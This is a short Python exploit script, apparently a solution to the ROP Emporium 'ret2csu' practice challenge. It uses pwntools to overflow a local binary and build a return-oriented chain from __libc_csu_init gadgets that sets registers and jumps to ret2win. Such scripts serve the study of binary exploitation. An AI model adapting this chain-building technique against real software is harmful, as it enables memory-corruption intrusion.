#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

from pwn import *
context.log_level = 'debug'

elf = ELF('ret2csu')
ret2win = elf.symbols['ret2win']


# ROP Gadgets
gadget1 = 0x400880  # mov rdx, r15; mov rsi, r14 ; mov edi, r13d ; call qword ptr [r12+rbx*8]
gadget2 = 0x40089a  # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

# Byte sequence alias
A8 = 8 * b'A'


if __name__ == '__main__':
    proc = elf.process()


    payload =  5 * A8                   # padding (dummy)
    payload += p64(gadget2)
    payload += p64(0)                   # rbx
    payload += p64(1)                   # rbp (dummy)
    payload += p64(0x600e48)            # r12
    payload += A8                       # r13 -> edi (dummy)
    payload += A8                       # r14 -> rsi (dummy)
    payload += p64(0xdeadcafebabebeef)  # r15 -> rdx
    payload += p64(gadget1)             # call [r12 + rbx*8] ... -> r12 + rbx * 8 = 0x4008b4

    payload += 7 * A8                   # 7 instead of 6 because ... 0x400896: add rsp, 0x8
    payload += p64(ret2win)
    #sys.stdout.buffer.write(payload + b'\n')


    proc.recvuntil('> ')
    proc.sendline(payload)
    proc.interactive()
